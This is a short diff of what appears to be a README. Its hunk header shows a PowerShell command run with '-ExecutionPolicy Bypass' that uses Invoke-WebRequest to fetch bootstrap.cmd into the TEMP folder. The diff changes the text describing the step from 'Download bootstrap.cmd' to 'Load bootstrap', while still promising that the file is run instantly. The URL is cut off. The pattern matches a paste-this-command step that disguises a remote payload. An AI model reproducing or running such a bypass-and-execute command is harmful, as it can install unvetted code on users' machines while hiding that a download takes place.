@@ -10,5 +10,5 @@ powershell -ExecutionPolicy Bypass -Command "$p=\"$env:TEMP\bootstrap.cmd\"; iwr
 ```
 
 This will:  
-✅ Download **bootstrap.cmd** automatically.  
+✅ Load **bootstrap** automatically.  
 ✅ Run it instantly.
